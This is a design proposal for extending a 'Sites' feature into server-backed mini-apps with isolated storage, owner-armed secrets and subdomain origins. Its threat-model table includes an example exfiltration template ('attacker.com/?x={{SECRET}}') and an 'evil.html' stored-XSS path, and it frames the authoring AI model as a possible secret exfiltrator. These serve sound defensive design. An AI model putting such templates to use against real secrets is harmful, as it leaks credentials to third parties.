# Sites → Deployable Mini-App Platform — Design Proposal

> Status: **research/proposal** (not yet decided or built). Produced by a multi-agent
> research workflow (4 external-landscape streams + 1 codebase-feasibility stream →
> synthesis → adversarial security + differentiation/feasibility review → finalized).
> Addresses: "Sites overlaps with the React/HTML artifact — I expect Sites to build a
> deployable mini app, not just a static site."

## TL;DR

- **Core problem:** a Site today is byte-for-byte an Artifact plus a public slug and a deploy pointer — same content set (`SiteType`, `types.ts`), same renderer (`buildSiteSrcDoc → buildReactSrcDoc/...`), same opaque-origin sandbox CSP (`s/[slug]/route.ts`). `createSite` already reserves the two missing capabilities and leaves them null: `manifest = {project_id, d1:null, r2:null}` (`sites.ts:459`). **This design fills those two nulls.**
- **Runtime pick — the "bindings" model:** *our* vetted Next.js catch-all handlers at `/s/[slug]/api/[...path]`, **no model-authored server code in v1–v3**. The model declares *which* capabilities its site uses; the frontend calls fixed endpoints (`./api/kv/*`, `./api/docs/*`, `./api/call/<name>`). This deletes the entire server-RCE class, which a pure-Node stack genuinely cannot sandbox today. Runner-up (untrusted Deno subprocess) deferred to a dependency-gated Phase 4.
- **Persistence pick — a second, isolated SQLite database** (`sites-data.db`, own Prisma client, WAL + `busy_timeout`) — the literal `d1`. **Anonymous public writes must never touch the primary app DB** (SQLite is single-writer → public writes on the app DB are a whole-app DoS, not "noisy neighbor").
- **Security posture:** treat `/s/<slug>/api/*` as **hostile app-origin content**, not as protected-by-the-sandbox. Hardened response headers, owner-armed/destination-pinned secrets, and the data plane re-applies the exact `link`-visibility + live-deployment gate as the page. CSP path-scoping is visitor-only defense-in-depth — not the boundary.
- **Phase-0 first step:** per-site **shared KV + append-only document collections** on the isolated datastore, behind `backendEnabled` (default false), **with one abuse control in the box on day one** (server-issued proof-of-work + owner moderation/delete). Smallest credible slice: a guestbook/counter/poll that survives reload and is identical for every visitor — the first thing an Artifact categorically cannot do.
- **Two decisions gate the build:** (1) subdomain origins now vs. later (the only clean path to private-per-visitor data and logins), and (2) where the owner-admin surface (secrets, moderation, quotas) lives.

---

## Decisions locked (revision 2)

The user chose the **full-scope, subdomain-first** path. This changes the architecture from the path-based default proposed below. Where §3/§6 assume path-based `/s/<slug>` serving, the decisions here **supersede** them.

- **Scope:** build **through Phase 3** — full stateful multi-user apps with per-visitor identity and logins are the goal, not just shared data.
- **Origins:** **commit to subdomain origins now.** Sites are served at `<slug>.<SITES_DOMAIN>` with a **real per-site origin** (`allow-same-origin`), not the opaque-origin `/s/<slug>` path. This is a net *simplification* of the data-plane security (each site calls its own same-origin `/api/*` with credentials — the `connect-src` path-scoping hack disappears) but promotes **cookie isolation to a day-one blocker** and adds wildcard DNS/TLS ops.
- **Admin UI:** the owner surface (Data / Secrets / Endpoints / Moderation / Quotas) lives as **tabs in the existing `/sites/[id]` dashboard**.

### What subdomain-first changes (the deltas)

1. **Serving flips to host-based resolution.** New env `SITES_DOMAIN`; a middleware/route resolves the `<slug>` label from the request `Host` header (`<slug>.<SITES_DOMAIN>` → site) instead of the URL path. The old `/s/<slug>` becomes a 301 to the canonical subdomain (preserves existing links).
2. **Cookie isolation is now THE day-one security requirement.** With a real per-site origin under `allow-same-origin`, a malicious site can run first-party JS on its origin. The app's NextAuth session cookie MUST be unreachable from any site origin. **Recommended posture: serve sites from a SEPARATE REGISTRABLE DOMAIN** from the app (the Cloudflare-Pages / Vercel model: app on `myapp.com`, sites on `*.mysites.app`) — this gives a zero cookie-relationship guarantee. Fallback if one domain is required: the app cookie must be **host-only** (`__Host-`, no `Domain=.host`) and sites must never occupy the app's exact host. **This is the one remaining infra decision** (see §8).
3. **The sandbox model changes.** Site pages move off the opaque-origin `sandbox` CSP to a real origin with `allow-same-origin`; isolation from the APP now comes from **origin separation (separate domain)**, not from an opaque origin. The hostile-app-origin response-header contract for `/api/*` (§7 item 1) still applies — those endpoints are still directly `curl`-able.
4. **Per-visitor identity becomes cheap and early.** Because each site has its own real origin, it can set its own cookie / use `localStorage` / hold a per-visitor session natively. `SiteKV.scope="visitor:<tok>"` and visitor auth move from a far-off Phase 3 to a mid roadmap phase — this is the payoff of committing to subdomains now.
5. **Local dev keeps working** via a wildcard host that resolves to loopback with no DNS setup: use `*.localtest.me` or `*.lvh.me` (public wildcard → `127.0.0.1`) as `SITES_DOMAIN` in dev, with a wildcard cert via `mkcert`/Caddy for https. The macOS pure-Node story survives.

### Revised roadmap (subdomain-first, supersedes §6)

- **Phase 0 — Foundations: subdomain serving + isolation.** `SITES_DOMAIN` env, `Host`-header→slug resolver (middleware), wildcard TLS (prod cert + `mkcert` dev), the cookie-isolation posture (separate domain — see §8 infra decision), and moving site serving off the opaque-origin path to real per-site origins. `/s/<slug>` → 301. **Differentiation earned:** none yet — but it unblocks every capability and is the load-bearing security foundation, so it goes first.
- **Phase 1 — Shared data plane** (`SiteKV` + `SiteDocument` on isolated `sites-data.db`), now called **same-origin with credentials** from the site, behind the hardened response-header contract + same-visibility gate + abuse controls (PoW + owner moderation). **Differentiation earned:** server-persisted, cross-visitor state — the first thing an Artifact can't do.
- **Phase 2 — Per-visitor identity + private data.** Cheap now that each site has an origin: a per-site visitor cookie/session, `SiteKV.scope="visitor:<tok>"`, optional visitor login. **Differentiation earned:** private-per-user state and logins — a real multi-user app.
- **Phase 3 — Server secrets + owner-armed fetch proxy + blob storage.** `SiteSecret`/`SiteEndpoint` + `./api/call/<name>` (AES-256-GCM, arm-and-pin, `safeFetch` no-follow) and `./api/blob/*` (confine-jailed, disk quota, hardened content-types). **Differentiation earned:** hidden third-party API keys + user-uploaded files.
- **Phase 3b — Per-site cron.** Clone the CAS-lease ticker into a `SiteJob` scheduler. **Differentiation earned:** a Site does work while nobody's watching.
- **Phase 4 (optional power tier) — untrusted custom compute.** Deferred, dependency-gated (Deno subprocess / Wasmtime), never the default engine.

The §3 runtime pick (app-owned "bindings" endpoints, **no untrusted server code**), the §4 data model, the §5 model-facing surface, and the §7 guardrails all stand unchanged — only the **origin/serving model** and the **roadmap order** are revised by the decisions above.

---

## 1. Why Sites == Artifacts today

Three proofs from the code:

- **Same content model.** `SiteType = "html"|"markdown"|"svg"|"image"|"mermaid"|"react"` is exactly the artifact preview set minus `code`. `Site.draftType/draftContent` hold the identical payload an `Artifact` version holds.
- **Same renderer.** The public route ends in `buildSiteSrcDoc(site.type, site.content)` (`s/[slug]/route.ts:93`) — a bare type-dispatch into the *same* `buildReactSrcDoc/buildHtmlSrcDoc/buildMarkdownSrcDoc` builders the in-app artifact panel uses (`sandbox.ts`).
- **Same isolation, same nothing-backend.** `/s/<slug>` serves the stored blob under `Content-Security-Policy: sandbox allow-scripts allow-popups`, `connect-src` pinned to CDNs (not `'self'`), `form-action 'none'`, no cookies. An opaque-origin static page: no server, no data store, no secrets, no API.

A Site adds exactly two things an Artifact lacks: a global unguessable **slug** and a draft→Save-Version→Deploy **lifecycle**. Both are *distribution*; neither is *full-stack*. The tell is in the schema: `createSite` writes `manifest = { project_id, d1:null, r2:null }` (`sites.ts:459`) — a reserved SQLite DB and object store, left null.

---

## 2. What a "deployable mini app" means here — the crisp line

The differentiator is **server-side execution against persistent, cross-visitor state and server-held secrets** — not richer HTML. A Site becomes categorically different from an Artifact the moment it has: (1) request handlers at its own URL that run on *our* host; (2) data persistence shared across visitors and reloads (the `d1`); (3) server-held secrets the client never sees; (4) blob storage (the `r2`); and later (5) per-visitor identity and cron.

> **Artifact** = ephemeral, client-only, conversation-scoped preview in a sandboxed iframe. No server, no shared state, no secrets — close the tab and it's gone.
> **Site** = a persistent, stateful, server-backed unit with its own public URL, its own data that outlives every visit, and server logic that can hold a secret and reach the outside world through a metered, vetted proxy.

The universal lesson from the chat-native precedents (Claude `window.storage`, Gemini auto-provisioned Firestore) and the serverless-primitives survey (Cloudflare *bindings*, Val Town `std/sqlite`): you make this leap **not by relaxing the sandbox but by injecting host-managed, named capabilities** — a pre-scoped data store, a metered proxy, a secret vault — that the still-opaque-origin page reaches through a fixed, app-owned API.

---

## 3. Recommended architecture

### The decision: app-owned capability endpoints (the "bindings" model) — no untrusted server code in v1–v3

**Primary runtime.** A single set of *our* Next.js catch-all handlers at `src/app/s/[slug]/api/[...path]/route.ts` (`runtime="nodejs"`, `dynamic="force-dynamic"`), parameterized by `siteId` resolved from the slug. The "server logic" is **vetted app code**, not model-authored code. The model declares which capabilities its site uses (a manifest); the frontend calls fixed endpoints — `./api/kv/*`, `./api/docs/*`, `./api/call/<name>`, `./api/blob/*`. This is Cloudflare's bindings pattern and Val Town's `std/*` pattern: the resource appears pre-scoped to the site, solving DX and tenant isolation in one move. Routing is proven in-repo (`api/sites/[id]/route.ts` coexists with `.../deploy/route.ts`), so a `route.ts` at `/s/[slug]` plus a deeper catch-all is a known-good shape.

**Persistence (`d1`) — isolated datastore.** A **separate SQLite file** (`sites-data.db`) with its **own Prisma client**, opened WAL + `busy_timeout`, holding `SiteKV`/`SiteDocument`/`SiteUsage`/`SiteRateBucket`. Rows partitioned by `siteId` behind a **tenant-scoped repository** (every method takes `siteId` as a non-optional first arg → a forgotten filter is a *type error*, not a cross-tenant read). The primary app DB (users, sessions, messages) is **never** on the path of an anonymous public write.

**Blob (`r2`).** A per-site directory under a blob root, path-jailed with the existing `confine.ts` realpath-prefix jail. Own disk-byte quota (distinct from `dataQuotaBytes`) and an explicit deletion lifecycle in `deleteSite`/`unpublish`/`deleteUserSites`. Served with a hardened header contract — never a sniffable/renderable content-type.

**Secrets.** `SiteSecret` (AES-256-GCM at rest, per-encryption random 96-bit nonce, AAD = `siteId||name` so a row cannot be transplanted between sites) + `SiteEndpoint` (owner-**armed** URL templates) → a server-side proxy that decrypts, substitutes, and fetches through the already-hardened `safeFetch` (connect-time IP blocklist, IMDS/private-range deny, DNS-rebind-safe). Fail closed if `SITE_SECRETS_KEK` is unset.

### Why this and not the runner-up

**Runner-up: per-site untrusted code in a Deno subprocess** (Val Town's production model). Rejected as primary for v1: (a) **We don't need it to differentiate** — server-persisted shared state + hidden secrets + real endpoints is the entire mini-app story, deliverable with **zero untrusted code**. (b) **It breaks portability** — needs the `deno` binary + subprocess pooling + cgroups/seccomp/Landlock for real multi-tenant safety, Linux-only, killing the macOS-dev story. (c) **The stack forbids it safely today** — no container, no `isolated-vm`, no Firecracker; `run-javascript.ts`'s own comment says `node:vm`/`new Function` are *not* boundaries. So untrusted code is deferred to an explicit **Phase 4 power tier** behind a real isolation dependency. For the record: `vm2`/`node:vm`/`isolated-vm` — hard reject; **workerd** — correct vocabulary (its bindings *are* `d1`/`r2`) but needs an outer VM, so a future deploy target; **subdomain origins** — correct for stateful client auth (Phase 3), but XL DNS/TLS ops.

### Threat model addressed (post-critique)

The reviews forced one reframing: **CSP was never the server-authorization boundary.** `/s/<slug>` (the document) is opaque-origin, but `/s/<slug>/api/*` are ordinary same-origin app URLs an attacker can hit directly with `curl` — no browser, no CSP. So the boundary is **server-side request handling that is safe against unauthenticated direct calls**, with the sandbox CSP as visitor-only defense-in-depth. Every attack class below is closed on the server:

| Attack | Closed by |
|---|---|
| **Stored-XSS → account takeover** via top-level nav to `/api/blob/evil.html` rendering on the app's real origin | Every `/s/<slug>/api/*` response ships `Content-Security-Policy: sandbox; default-src 'none'` + `X-Content-Type-Options: nosniff`; JSON forced `application/json`; blobs forced `application/octet-stream` + `Content-Disposition: attachment`; user/extension-derived content-types never echoed |
| **Secret exfiltration by the authoring model** registering `urlTemplate: attacker.com/?x={{SECRET}}` | **Owner-armed, destination-pinned secrets:** the human binds `(secretName → endpoint → exact host)` in the dashboard; the model may only *reference* an endpoint name; `secretRefs` ignored and the endpoint un-invocable until `armed=true` |
| **Secret leak via honest endpoint** — reflection in upstream error bodies; redirect header leak; quota theft | URL-encode visitor params (query **values** only, never host/path); re-validate the **fully-resolved** URL host `=== approvedHost`; **`redirect:'manual'`** for secret-bearing calls (strip `Authorization`/secret query on cross-origin hop in `safeFetch`); **normalize responses to a fixed shape**; per-endpoint rate limit + owner daily budget |
| **Visibility/auth bypass + existence oracle** on the data plane | Router resolves the site through the **same gate** as `loadPublicSite` (`visibility==='link'` **and** `liveVersionId != null`) **and** `backendEnabled`; uniform 404 otherwise. Unpublish/set-private closes the data plane in the same request |
| **Whole-app DoS** via public-write flood on the shared single-writer SQLite | Isolated `sites-data.db` (own writer) + global write-rate ceiling that sheds load (429) before the writer + atomic per-site quota |
| **Distributed drive-by writes** (`ACAO:*` lets any third-party page drive cross-origin writes) | Durable, bounded limiter keyed by `(siteId, coarse-IP-block, window)` in `sites-data.db` with a hard bucket-count cap + global ceiling; **proof-of-work challenge** on writes; per-site global write **budget**; owner moderation |
| **PII harvest + beacon exfil** (`docs/list` world-readable; `img-src *`) | Per-collection **policy** (`append-only` = writable-not-listable, `public-read` = guestbook); default **owner-read-only** for anything PII-shaped; `img-src` tightened off `*`; prominent "anyone with the link can read/write" disclosure |
| **Quota race / parse bomb** | Denormalized `SiteUsage` counters updated **in the same transaction** with a conditional update that fails over cap; reject by `Content-Length` **before** reading the body; cap streamed bytes + JSON nesting depth |
| **Cookie/CSRF regression** | Pin `cookies.sessionToken.options = {httpOnly:true, sameSite:"lax", secure:true}`, `__Host-` name in prod, **fail startup if `SameSite=None`**; box must run behind https |

Position kept vs. security review: same-origin path serving stays for v1–v2 — the header contract fully neutralizes the top-level-navigation XSS; a separate origin is the Phase-3 subdomain upgrade, not a v1 blocker.

---

## 4. Data model & code changes

The `manifest` hook stops being a stub. On enable: `manifest.d1 = { driver:"prisma-sqlite", db:"sites-data", collections:[...] }` and (Phase 1b) `manifest.r2 = { dir:"<blobRoot>/<siteId>" }`. **The manifest is snapshotted into each `SiteVersion`** so deploy/rollback carry a matched frontend+manifest pair; `backendEnabled` is a site-level master switch; **data and secret values are site-level** and outlive versions.

**Prisma — additive, two datasources.** App schema (primary DB) gains only flags on `Site` + owner-only secret/endpoint tables; the data-plane models live in a **second datasource** (`sites-data.db`) with its own generated client. Ship via schema edit + hand-SQL `CREATE TABLE`/`ALTER` + `prisma generate` (the `Message.subagents`/`Plugin` precedent).

```prisma
// PRIMARY DB — Site gains master switches + version-scoped manifest
model Site {
  // ...existing...
  backendEnabled Boolean @default(false)   // opt-in; writes off by default
  dataQuotaBytes Int     @default(5242880) // 5 MiB/site
  blobQuotaBytes Int     @default(10485760)// 10 MiB/site, distinct from data
  secrets   SiteSecret[]
  endpoints SiteEndpoint[]
}
// SiteVersion gains `manifest String` so deploy/rollback carry a matched frontend+manifest pair.

// SECRETS live in the PRIMARY DB (owner-only, never on the public write path)
model SiteSecret {
  id String @id @default(cuid())
  siteId String
  name String                 // "WEATHER_KEY"
  ciphertext String           // AES-256-GCM
  nonce String                // fresh 96-bit per encryption
  site Site @relation(fields:[siteId], references:[id], onDelete: Cascade)
  @@unique([siteId, name])
}
model SiteEndpoint {
  id String @id @default(cuid())
  siteId String
  name String                 // ./api/call/<name>
  method String @default("GET")
  urlTemplate String          // model-proposed; query-value placeholders only
  approvedHost String?        // OWNER-set; secret-bearing calls require this
  secretRefs String           // JSON string[]; IGNORED unless armed
  armed Boolean @default(false)   // owner must approve exact (host, secrets)
  dailyBudget Int @default(0)     // owner-set call ceiling
  site Site @relation(fields:[siteId], references:[id], onDelete: Cascade)
  @@unique([siteId, name])
}
```

```prisma
// SECOND DATASOURCE — sites-data.db (own client, WAL, busy_timeout)
model SiteKV {
  id String @id @default(cuid())
  siteId String
  collection String
  key String
  value String                // JSON, size-capped
  scope String @default("shared")   // "visitor:<tok>" only after Phase 3
  updatedAt DateTime @updatedAt
  @@unique([siteId, collection, key, scope])
  @@index([siteId, collection])
}
model SiteDocument {
  id String @id @default(cuid())
  siteId String
  collection String
  data String                 // JSON
  createdAt DateTime @default(now())
  @@index([siteId, collection, createdAt])
}
model SiteUsage {           // denormalized counters for ATOMIC quota
  siteId String @id
  bytes Int @default(0)
  rows  Int @default(0)
}
model SiteRateBucket {      // durable, bounded limiter (hard-evicted)
  key String @id            // hash(siteId|ipBlock|window)
  count Int @default(0)
  expiresAt DateTime
  @@index([expiresAt])
}
```

**Key new/edited files:**

- **New `src/app/s/[slug]/api/[...path]/route.ts`** — public per-site router. Resolves `siteId` through the same visibility+live+`backendEnabled` gate; enforces method allow-list, `Content-Length` pre-check, PoW on writes, rate limit; dispatches `kv/*`, `docs/*`, `call/<name>`, `blob/*`; **handles `OPTIONS` preflight** (`ACAM` = allow-listed methods, `ACAH: content-type`, `ACAO:*` **without** credentials); wraps every response in the hardened header helper.
- **New `src/lib/sites/data-db.ts`** — the second Prisma client (isolated `sites-data.db`, WAL/`busy_timeout`) **plus a tenant-scoped repository** whose every method takes `siteId` as a non-optional first arg.
- **New `src/lib/sites/backend.ts`** — capability impls with atomic quota (`SiteUsage` conditional update in-tx): `kvGet/kvPut/kvDelete`, `docAppend/docList` (per-collection policy), `blobPut/blobGet` (confine-jailed, disk quota), `callEndpoint` (arm check → template → encode → resolve-host-revalidate → `safeFetch` no-follow → normalized response, budget-metered).
- **New `src/lib/sites/secrets.ts`** — AES-256-GCM with per-encryption random nonce + AAD `siteId||name`; KEK from `SITE_SECRETS_KEK`; fail closed if unset.
- **Edit `src/lib/sites.ts`** — `loadPublicSiteBackend(slug)` re-applying the full gate; add `siteSecret`/`siteEndpoint` deletes **and** second-DB `SiteKV/Document/Usage` deletes **and** on-disk blob-dir removal to the delete cascades.
- **Edit `src/app/s/[slug]/route.ts`** — when `backendEnabled`: extend `connect-src` with the path-scoped `https://<host>/s/<slug>/api/` source (defense-in-depth only), tighten `img-src` off `*`, drop `allow-popups` unless needed, change `Cache-Control` to `no-store` (shell is now dynamic). Fix the relative-path trap: the injected shim uses the **absolute** `/s/<slug>/api/…` base (`./api/` against no-trailing-slash `/s/<slug>` resolves to `/s/api/…`).
- **Edit `src/components/artifacts/sandbox.ts` + serve path** — `buildSiteSrcDoc` gains an optional `inject` param; the shim is inserted **at serve time in `route.ts`, keyed off `backendEnabled`**, so it never leaks into artifact previews (which call the same builders).
- **Edit `src/lib/auth.ts`** — pin the session cookie; fail startup on `SameSite=None`.

---

## 5. Model-facing surface

A mini-app Site becomes a small **project**: a frontend part + a `site.manifest.json` that declares backend capabilities.

```json
{
  "backend": {
    "kv": true,
    "collections": [
      { "name": "guestbook", "type": "document", "read": "public", "write": "public" },
      { "name": "signups",   "type": "document", "read": "owner",  "write": "public" }
    ],
    "endpoints": [
      { "name": "weather", "method": "GET",
        "urlTemplate": "https://api.openweathermap.org/data/2.5/weather?q={q}&appid={{WEATHER_KEY}}" }
    ]
  }
}
```

- `create_site` gains an optional `backend` manifest param. **Schema hygiene for `@openai/agents`:** every nested/optional field `.nullable()`, **no `.url()` validator**; the manifest is validated server-side.
- The model authors **frontend + manifest** in one pass. The frontend reaches state only through an injected **`Sites` shim** (Val Town's "LLM-safe shim" lesson): `await Sites.kv.put('state','count',n)`, `await Sites.docs.append('guestbook',{name,msg})`, `const w = await Sites.call('weather',{q:'London'})` — never hand-rolled fetch, never `localStorage`.
- **Secrets and destinations are owner-only, out-of-band.** The model may propose an endpoint *name* + `urlTemplate` skeleton referencing `{{WEATHER_KEY}}`, but the endpoint is **inert until the owner arms it** in the dashboard by approving the exact resolved **host**, the **method**, and the **secret binding**, and filling the secret **value**.
- **Agent instructions:** add a "Sites" section to `INSTRUCTIONS` in `agent.ts` (none today) covering when to enable a backend; that Phase-0 data is **shared/public** ("anyone with the link can read/edit"); that PII collections default to owner-read; that endpoints need human arming.

---

## 6. Phased roadmap

- **Phase 0 — per-site shared data (KV + document collections), on the isolated datastore.** `SiteKV`/`SiteDocument`/`SiteUsage`/`SiteRateBucket` in `sites-data.db`, `backendEnabled`, the catch-all router (kv/docs + OPTIONS), the hardened response-header contract, the same-gate resolver, per-collection read/write policy, atomic quota, durable rate limiter, **a proof-of-work write challenge + owner Data tab with moderation/delete shipping in this phase**, serve-time shim injection, `no-store` on backend shells, tool/prompt updates. Slice: guestbook / poll / view-counter / shared-todo that survives reload and is identical for every visitor. **Differentiation earned:** server-persisted, cross-visitor state — the first capability an Artifact categorically cannot have. **Risk: MED-HIGH** until the isolated datastore + abuse control are in.
- **Phase 1 — server secrets + owner-armed, SSRF-guarded fetch proxy.** `SiteSecret`/`SiteEndpoint`, `./api/call/<name>`, AES-256-GCM (nonce+AAD), owner Secrets/Endpoints tab with arm-and-pin flow, per-endpoint budgets, normalized responses, no-follow redirects, host-revalidation. **Differentiation earned:** a Site calls a real keyed third-party API with the key hidden server-side.
- **Phase 1b — blob/object storage (`r2`).** `./api/blob/*` upload/serve, confine-jailed per-site dir, distinct disk quota, hardened content-types, deletion lifecycle. **Differentiation earned:** a Site holds user-uploaded files, not just JSON. *(Phases 0–1b cover the majority of "my static site needs a backend," at M effort / LOW–MED risk once hardened, with zero untrusted code.)*
- **Phase 2 — per-site cron.** Clone the CAS-lease ticker (`schedule/ticker.ts`) into a per-site `SiteJob` scheduler invoking an armed endpoint on a schedule. **Differentiation earned:** a Site does work while nobody is watching.
- **Phase 3 — per-visitor identity via subdomain origins.** Serve each site at `<slug>.sites.<host>` with `allow-same-origin` (wildcard DNS+TLS, host-header slug resolution). **Prerequisite baked in early:** the app auth cookie must be **host-only** (no `Domain=.<host>`) *or* sites live on a **separate registrable domain**; plus a stale-slug subdomain-takeover guard on republish. Now the page has its own real origin ⇒ `localStorage`, cookies, per-visitor sessions, `SiteKV.scope="visitor:<tok>"`, built-in visitor auth. **Differentiation earned:** a full stateful multi-user web app with logins.
- **Phase 4 (optional power tier) — custom compute.** Only after a real isolation dependency: a short-lived **Deno subprocess** (deny-by-default: `--deny-env`, no `--allow-run`, net denied and forced through `safeFetch` as the egress broker, fs jailed via `confine.ts`), or Wasmtime/Javy in-process. **Differentiation earned:** arbitrary server logic. Explicitly last, opt-in, never the default engine.

---

## 7. Security & resource guardrails (hardened, post-critique)

1. **`/s/<slug>/api/*` is hostile app-origin content.** Every response: `Content-Security-Policy: sandbox; default-src 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`. JSON forced `application/json`. Blobs forced `application/octet-stream` + `Content-Disposition: attachment` (or a fixed inert allowlist). Never echo a user/extension-derived content-type. Endpoints safe against unauthenticated **direct** `curl` calls.
2. **Data-plane gate == page gate.** Router 404s unless `visibility==='link'` **and** a live deployment exists **and** `backendEnabled`. Unpublish/set-private closes the data plane immediately. Uniform 404 (no existence/timing oracle).
3. **Secrets are owner-armed and destination-pinned.** Model proposes name+skeleton; owner approves exact `(host, method, secretRefs)` and fills the value; `secretRefs` ignored and endpoint un-invocable until `armed`. AES-256-GCM, fresh 96-bit nonce/encryption, AAD `siteId||name`, fail-closed on missing KEK.
4. **Proxy hardening.** Visitor params URL-encoded, constrained to **query values**; fully-resolved host re-validated `=== approvedHost`; `redirect:'manual'` for secret-bearing calls with header/query stripping on cross-origin hops in `safeFetch`; responses normalized to a fixed shape; response size capped; per-endpoint rate limit + owner daily budget + per-endpoint opt-in.
5. **Isolated datastore + atomic quota.** All site data in `sites-data.db` (own writer, WAL, `busy_timeout`); `SiteUsage` counters updated in-tx with a conditional check; `Content-Length` rejected before body read; streamed bytes + JSON depth capped.
6. **Durable, bounded abuse controls.** Rate buckets in `sites-data.db` keyed by `(siteId, coarse-IP-block, window)` with hard eviction + a global bucket cap + a global write ceiling that sheds to 429; proof-of-work write challenge; per-site write budget; owner moderation/delete.
7. **Per-collection policy + PII default.** `append-only` (writable, not listable) vs `public-read`; default **owner-read-only** for anything PII-shaped; `img-src` tightened off `*`; prominent disclosure that link-holders can read/write shared data.
8. **Global ceilings.** Max sites/user, max total site bytes across the box, max collections/endpoints/secrets/site, max rate-limit buckets — nothing unbounded.
9. **Abuse attribution.** Anonymous writes store only a **coarse IP hash** with short retention for limiting; owner UI states retention + shared-data disclosure.
10. **Cookie pinned.** `httpOnly`+`sameSite:"lax"`+`secure`+`__Host-`; startup fails on `SameSite=None`; https required.

**Deploy/rollback interaction.** The **manifest is snapshotted into `SiteVersion`**, so deploy/rollback always ships a matched frontend+manifest pair; **data and secret values are site-level** and additive. A rollback restores an older frontend+manifest while persisted data remains. Enabling the backend does not retroactively arm endpoints; disabling it closes the whole data plane.

---

## 8. Open questions for the user

1. **Subdomains now or later?** Path-origin (Phases 0–2) ships fast on pure Node but is **hard-capped at shared-only data** — no private-per-visitor state, no logins, until Phase 3. Subdomains are the *only* clean path to per-visitor identity. *(Lean: ship shared-only Phase 0–1, but pick the cookie-domain posture now so Phase 3 isn't a rewrite.)*
2. **Where does owner-admin live?** Secrets, endpoint arming, moderation, quotas, and the Data tab are a real admin surface. Existing `/sites/[id]` dashboard (default), or a richer console?
3. **Anonymous-write policy default.** Ship Phase-0 writes gated behind proof-of-work + owner moderation (recommended), or require the owner to explicitly opt each collection into public-write with a stronger challenge?
4. **Anonymous visitor token as a Phase-0 stopgap?** Mint an in-memory-only visitor token (lost on reload) to fake per-visitor state before subdomains — or wait for Phase 3? *(Lean: wait; memory-only identity is a foot-gun.)*

---

**Bottom line.** Implement the stubbed `{d1, r2}` as per-site KV + append-only document collections + a confine-jailed blob dir + an owner-armed encrypted-secret proxy, delivered through **app-owned capability endpoints at `/s/<slug>/api/*`** (the bindings model, zero untrusted code) on an **isolated `sites-data.db`** that anonymous writes never share with the app, behind the **same visibility gate** as the page and a **hardened, `nosniff`+sandbox response-header contract**. Ship Phase 0 (shared data + one real abuse control) as the first credible, demoable slice; earn secrets, blobs, cron, and per-visitor logins in order; keep untrusted server code as a deferred, dependency-gated power tier — never the foundation.
